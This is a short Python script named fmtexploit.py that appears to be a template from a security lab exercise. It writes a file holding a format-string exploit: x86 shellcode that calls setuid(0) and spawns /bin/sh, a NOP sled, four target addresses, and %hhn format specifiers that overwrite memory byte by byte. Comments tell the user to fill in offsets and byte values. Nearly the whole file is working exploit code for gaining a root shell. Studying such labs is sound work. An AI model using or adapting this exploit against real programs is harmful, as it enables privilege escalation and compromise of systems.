#!/usr/bin/python3
#fmtexploit.py

import sys

shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

N = 200

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the shellcode at the end
start = N - len(shellcode)
content[start:] = shellcode

# Put the address at the beginning
addr1 = 0xAABBCCDD + offset1    #Update offset1 to get the address for the smallest byte 
addr2 = 0xAABBCCDD + offset2    #Update offset2 to get the address for the second smallest byte 
addr3 = 0xAABBCCDD + offset3    #Update offset3 to get the address for the third smallest byte 
addr4 = 0xAABBCCDD + offset4    #Update offset4 to get the address for the largest byte 

content[0:4]   = (addr1).to_bytes(4,byteorder='little')
content[4:8]   = ("@@@@").encode('latin-1')
content[8:12]  = (addr2).to_bytes(4,byteorder='little')
content[12:16] = ("@@@@").encode('latin-1')
content[16:20] = (addr3).to_bytes(4,byteorder='little')
content[20:24] = ("@@@@").encode('latin-1')
content[24:28] = (addr4).to_bytes(4,byteorder='little')

# Add the format specifiers
first  = 0xAC - 28 - 15*8    #Update 0xAC to the smallest byte
second = 0xE4 - 0xAC         #Update 0xAC to the smallest byte and update 0xE4 to the second smallest byte 
third  = 0xF3 - 0xE4         #Update 0xE4 to the second smallest byte and update 0xF3 to the third smallest byte
fourth = 0xFF - 0xF3         #Update 0xF3 to the third smallest byte and update 0xFF to the largest byte
s = "%.8x"*15 + "%." + str(first) + "x" + "%hhn" \
              + "%." + str(second) + "x" + "%hhn" \
              + "%." + str(third) + "x" + "%hhn" \
              + "%." + str(fourth) + "x" + "%hhn"
fmt  = (s).encode('latin-1')
content[28:28+len(fmt)] = fmt

# Write the content to formatfile
with open('formatfile', 'wb') as f:
    f.write(content)